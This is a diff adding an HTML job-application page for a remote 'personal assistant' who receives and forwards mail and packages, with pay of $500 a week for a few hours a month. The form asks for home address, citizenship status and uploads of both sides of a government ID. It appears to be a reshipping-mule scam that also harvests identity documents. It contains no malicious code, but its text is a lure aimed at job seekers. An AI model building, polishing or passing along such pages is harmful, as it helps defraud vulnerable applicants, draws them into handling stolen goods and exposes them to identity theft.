@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Body Mind And Soul Job Application</title>
+    <!-- link to CSS -->
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+     <div class="application-card">
+          <header class="application-header">
+               <p class="eyebrow">BODY MIND AND SOUL</p>
+               <h1>Apply Now</h1>
+               <p class="header-copy">Complete the application below to be considered for this opportunity.</p>
+               <div class="progress" aria-label="Application progress">
+                    <span class="progress-step active"><b>1</b> Your details</span>
+                    <span class="progress-line"></span>
+                    <span class="progress-step"><b>2</b> Documents</span>
+                    <span class="progress-line"></span>
+                    <span class="progress-step"><b>3</b> Submit</span>
+               </div>
+          </header>
+
+          <main>
+               <img class="application-image" src="https://res.cloudinary.com/dbhdfiqcn/image/upload/c_fit,w_1200/v1786305839/195B55E2-F0E5-48B7-82FF-4205C5D27DCC_tykhrj.jpg" alt="Remote Personal Assistant — Now Hiring">
+
+               <section class="form-card about-card">
+                    <p class="section-kicker">01 / OVERVIEW</p>
+                    <h2>About the Position</h2>
+                    <p>My name is Jeanna Bretty. I am offering a flexible part-time personal assistant position that can be performed remotely, provided the individual has access to a local post office. Tasks may be completed during free time outside of work or school hours.</p>
+                    <p>Responsibilities include receiving and forwarding mail or packages and assisting with occasional local errands. All assignments will take place within the applicant’s city or town. No vehicle is required, as public transportation or taxi services may be used.</p>
+                    <div class="position-meta"><span><strong>$500</strong> per week</span><span><strong>15–20</strong> hours per month</span><span><strong>Remote</strong> location</span></div>
+               </section>
+
+               <form class="application-form">
+                    <section class="form-card">
+                         <p class="section-kicker">02 / CONTACT</p>
+                         <h2>Personal Information</h2>
+                         <div class="field-grid">
+                              <div class="field"><label for="full_name">Full Name</label><div class="input-wrap"><span class="input-icon">👤</span><input type="text" id="full_name" placeholder="David Jones" required></div></div>
+                              <div class="field"><label for="email">Email Address</label><div class="input-wrap"><span class="input-icon">✉</span><input type="email" id="email" placeholder="you@example.com" required></div></div>
+                              <div class="field"><label for="phone">Phone Number</label><div class="input-wrap"><span class="input-icon">☎</span><input type="tel" id="phone" placeholder="(123) 456-7890" required></div></div>
+                         </div>
+                    </section>
+
+                    <section class="form-card">
+                         <p class="section-kicker">03 / ELIGIBILITY</p>
+                         <h2>Eligibility Questions</h2>
+                         <fieldset class="choice-group"><legend>Are you legally authorised to work?</legend><div class="choice-grid"><label class="choice-card"><input type="radio" name="work_auth" value="yes" required><span><strong>Yes</strong><small>I am authorised to work</small></span></label><label class="choice-card"><input type="radio" name="work_auth" value="no"><span><strong>No</strong><small>I am not authorised to work</small></span></label></div></fieldset>
+                         <fieldset class="choice-group"><legend>Are you a U.S. citizen?</legend><div class="choice-grid"><label class="choice-card"><input type="radio" name="citizen" value="yes" required><span><strong>Yes</strong><small>I am a U.S. citizen</small></span></label><label class="choice-card"><input type="radio" name="citizen" value="no"><span><strong>No</strong><small>I am not a U.S. citizen</small></span></label></div></fieldset>
+                    </section>
+
+                    <section class="form-card">
+                         <p class="section-kicker">04 / LOCATION</p>
+                         <h2>Address Details</h2>
+                         <div class="field-grid address-grid">
+                              <div class="field field-wide"><label for="street">Street Address</label><div class="input-wrap"><span class="input-icon">⌂</span><input type="text" id="street" placeholder="123 Main Street" required></div></div>
+                              <div class="field"><label for="city">City</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="city" placeholder="New York" required></div></div>
+                              <div class="field"><label for="state">State</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="state" placeholder="New York" required></div></div>
+                              <div class="field"><label for="zip">ZIP / Postal Code</label><div class="input-wrap"><span class="input-icon">#</span><input type="text" id="zip" placeholder="10001" required></div></div>
+                              <div class="field"><label for="country">Country</label><div class="input-wrap"><span class="input-icon">◎</span><input type="text" id="country" placeholder="United States" required></div></div>
+                         </div>
+                    </section>
+
+                    <section class="form-card">
+                         <p class="section-kicker">05 / EXPERIENCE</p>
+                         <h2>Your Suitability</h2>
+                         <label for="suitability">How does the opportunity relate to your suitability?</label>
+                         <textarea id="suitability" rows="5" placeholder="Briefly describe your qualifications and relevant experience..." required></textarea>
+                    </section>
+
+                    <section class="form-card document-card">
+                         <p class="section-kicker">06 / DOCUMENTS</p>
+                         <h2>Upload Documents</h2>
+                         <div class="field-grid"><div class="field"><label for="resume">Resume</label><input class="file-input" type="file" id="resume" accept=".pdf,.doc,.docx" required></div><div class="field"><label for="id_front">Government ID — Front</label><input class="file-input" type="file" id="id_front" accept=".pdf,.jpg,.png" required></div><div class="field"><label for="id_back">Government ID — Back</label><input class="file-input" type="file" id="id_back" accept=".pdf,.jpg,.png" required></div></div>
+                    </section>
+                    <button class="apply-button" type="submit">Submit Application <span>→</span></button>
+               </form>
+          </main>
+          <footer><p>© 2026 Body Mind And Soul</p></footer>
+     </div>
+</body>
+</html>
